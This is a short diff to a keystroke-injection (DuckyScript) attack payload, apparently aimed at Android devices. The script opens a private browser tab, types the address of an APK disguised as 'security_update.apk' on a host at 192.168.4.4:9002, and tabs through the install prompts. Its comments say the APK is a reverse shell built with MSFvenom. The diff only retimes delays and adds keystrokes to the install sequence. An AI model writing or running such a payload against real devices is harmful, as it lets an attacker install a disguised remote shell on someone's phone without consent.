@@ -8,10 +8,10 @@ CTRL SHIFT n
 DELAY 500
 CTRL l
 DELAY 1000
-REM Change to the URL of your APK. APK can be created using MSFvenom
+REM Change URL to the path of your APK. APK reverse shells can be created with MSFvenom
 STRING 192.168.4.4:9002/security_update.apk
 ENTER
-DELAY 5000
+DELAY 7000
 TAB
 TAB
 DOWN
@@ -39,7 +39,8 @@ TAB
 TAB
 TAB
 TAB
-TAB
 DELAY 350
 TAB
+ENTER
+DELAY 350
 ENTER
